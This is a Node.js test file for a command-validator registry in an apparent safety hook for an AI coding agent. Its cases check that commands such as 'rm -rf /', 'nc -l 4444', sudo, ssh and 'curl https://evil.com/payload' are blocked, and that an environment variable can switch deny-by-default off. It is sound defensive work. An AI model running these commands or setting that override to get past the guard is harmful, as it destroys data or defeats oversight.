'use strict';

const { describe, test } = require('node:test');
const assert = require('node:assert');

const {
  VALIDATOR_REGISTRY,
  getValidator,
  hasValidator,
  getRegisteredCommands,
  validateCommand,
  registerValidator,
  validators,
} = require('../../.claude/hooks/safety/validators/registry.cjs');

describe('registry', () => {
  describe('VALIDATOR_REGISTRY', () => {
    test('is a Map', () => {
      assert.ok(VALIDATOR_REGISTRY instanceof Map);
    });

    test('contains shell interpreters', () => {
      assert.ok(VALIDATOR_REGISTRY.has('bash'));
      assert.ok(VALIDATOR_REGISTRY.has('sh'));
      assert.ok(VALIDATOR_REGISTRY.has('zsh'));
    });

    test('contains network commands', () => {
      assert.ok(VALIDATOR_REGISTRY.has('curl'));
      assert.ok(VALIDATOR_REGISTRY.has('wget'));
      assert.ok(VALIDATOR_REGISTRY.has('nc'));
      assert.ok(VALIDATOR_REGISTRY.has('ssh'));
      assert.ok(VALIDATOR_REGISTRY.has('sudo'));
    });

    test('contains git command', () => {
      assert.ok(VALIDATOR_REGISTRY.has('git'));
    });

    test('contains filesystem commands', () => {
      assert.ok(VALIDATOR_REGISTRY.has('rm'));
      assert.ok(VALIDATOR_REGISTRY.has('chmod'));
    });
  });

  describe('getValidator', () => {
    test('returns validator function for registered command', () => {
      const validator = getValidator('bash');
      assert.strictEqual(typeof validator, 'function');
    });

    test('returns null for unregistered command', () => {
      const validator = getValidator('unknown-command');
      assert.strictEqual(validator, null);
    });
  });

  describe('hasValidator', () => {
    test('returns true for registered command', () => {
      assert.strictEqual(hasValidator('curl'), true);
    });

    test('returns false for unregistered command', () => {
      assert.strictEqual(hasValidator('unknown'), false);
    });
  });

  describe('getRegisteredCommands', () => {
    test('returns array of command names', () => {
      const commands = getRegisteredCommands();
      assert.ok(Array.isArray(commands));
      assert.ok(commands.includes('bash'));
      assert.ok(commands.includes('curl'));
    });
  });

  describe('validateCommand', () => {
    test('returns invalid for null input', () => {
      const result = validateCommand(null);
      assert.strictEqual(result.valid, false);
    });

    test('allows unregistered commands', () => {
      const result = validateCommand('ls -la');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.hasValidator, false);
    });

    test('allows safe git command', () => {
      const result = validateCommand('git status');
      assert.strictEqual(result.valid, true);
    });

    test('blocks sudo', () => {
      const result = validateCommand('sudo apt install');
      assert.strictEqual(result.valid, false);
    });

    test('blocks ssh', () => {
      const result = validateCommand('ssh user@server');
      assert.strictEqual(result.valid, false);
    });

    test('blocks nc', () => {
      const result = validateCommand('nc -l 4444');
      assert.strictEqual(result.valid, false);
    });

    test('blocks rm -rf /', () => {
      const result = validateCommand('rm -rf /');
      assert.strictEqual(result.valid, false);
    });

    test('allows curl to allowed domain', () => {
      const result = validateCommand('curl https://registry.npmjs.org/pkg');
      assert.strictEqual(result.valid, true);
    });

    test('blocks curl to arbitrary domain', () => {
      const result = validateCommand('curl https://evil.com/payload');
      assert.strictEqual(result.valid, false);
    });

    test('handles absolute path commands', () => {
      const result = validateCommand('/usr/bin/git status');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.hasValidator, true);
    });
  });

  describe('registerValidator', () => {
    test('registers a new validator', () => {
      const customValidator = _cmd => ({ valid: true, error: '' });
      registerValidator('test-cmd', customValidator);
      assert.ok(hasValidator('test-cmd'));
      VALIDATOR_REGISTRY.delete('test-cmd');
    });

    test('throws error for non-function', () => {
      assert.throws(() => {
        registerValidator('bad', 'not a function');
      }, /Validator must be a function/);
    });
  });

  describe('validators namespace', () => {
    test('exports shell validators', () => {
      assert.ok(validators.shell);
      assert.strictEqual(typeof validators.shell.validateBashCommand, 'function');
    });

    test('exports network validators', () => {
      assert.ok(validators.network);
      assert.strictEqual(typeof validators.network.validateCurlCommand, 'function');
    });
  });

  describe('integration', () => {
    test('shell -c revalidates inner command', () => {
      const result = validateCommand('bash -c "rm -rf /"');
      assert.strictEqual(result.valid, false);
    });

    test('safe shell -c allowed', () => {
      const result = validateCommand('bash -c "npm test"');
      assert.strictEqual(result.valid, true);
    });
  });

  describe('Framework Self-Testing Commands', () => {
    test('ALLOWS claude command for headless testing', () => {
      // Claude CLI is needed for headless framework testing (claude -p "test")
      const result = validateCommand('claude -p "test routing"');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.hasValidator, false);
      assert.strictEqual(result.reason, 'allowlisted');
    });

    test('ALLOWS claude with various flags', () => {
      // Various claude CLI invocations
      assert.strictEqual(validateCommand('claude --version').valid, true);
      assert.strictEqual(validateCommand('claude --help').valid, true);
      assert.strictEqual(validateCommand('claude chat').valid, true);
    });
  });

  describe('SEC-CRITICAL: eval and exec must NOT be in SAFE_COMMANDS_ALLOWLIST', () => {
    test('eval is NOT in allowlist (security critical)', () => {
      const { SAFE_COMMANDS_ALLOWLIST } = require('../../.claude/hooks/safety/validators/registry.cjs');
      assert.ok(!SAFE_COMMANDS_ALLOWLIST.includes('eval'),
        'eval MUST NOT be in SAFE_COMMANDS_ALLOWLIST - it enables arbitrary code execution');
    });

    test('exec is NOT in allowlist (security critical)', () => {
      const { SAFE_COMMANDS_ALLOWLIST } = require('../../.claude/hooks/safety/validators/registry.cjs');
      assert.ok(!SAFE_COMMANDS_ALLOWLIST.includes('exec'),
        'exec MUST NOT be in SAFE_COMMANDS_ALLOWLIST - it enables arbitrary code execution');
    });
  });

  describe('SEC-AUDIT-017: Deny-by-Default for Unregistered Commands', () => {
    test('BLOCKS unregistered command: perl -e', () => {
      const result = validateCommand('perl -e "print 1"');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-017'));
      assert.ok(result.error.includes('perl'));
      assert.strictEqual(result.hasValidator, false);
    });

    test('BLOCKS unregistered command: ruby -e', () => {
      const result = validateCommand('ruby -e "puts 1"');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-017'));
      assert.ok(result.error.includes('ruby'));
    });

    test('BLOCKS unregistered command: awk', () => {
      const result = validateCommand('awk "{print $1}" file.txt');
      assert.strictEqual(result.valid, false);
      assert.ok(result.error.includes('SEC-AUDIT-017'));
      assert.ok(result.error.includes('awk'));
    });

    test('ALLOWS allowlisted command: ls -la', () => {
      const result = validateCommand('ls -la');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.hasValidator, false);
    });

    test('ALLOWS allowlisted command: npm test', () => {
      const result = validateCommand('npm test');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.hasValidator, false);
    });

    test('ALLOWS allowlisted command: git status', () => {
      // This also has a validator, but should still pass
      const result = validateCommand('git status');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.hasValidator, true);
    });

    test('ALLOWS override with env var', () => {
      const originalEnv = process.env.ALLOW_UNREGISTERED_COMMANDS;
      process.env.ALLOW_UNREGISTERED_COMMANDS = 'true';

      const result = validateCommand('perl -e "print 1"');
      assert.strictEqual(result.valid, true);
      assert.strictEqual(result.hasValidator, false);

      // Restore env
      if (originalEnv === undefined) {
        delete process.env.ALLOW_UNREGISTERED_COMMANDS;
      } else {
        process.env.ALLOW_UNREGISTERED_COMMANDS = originalEnv;
      }
    });

    test('registered validators still work normally', () => {
      // Registered command with validator should still validate
      const result = validateCommand('sudo apt install');
      assert.strictEqual(result.valid, false);
      assert.strictEqual(result.hasValidator, true);
    });
  });
});
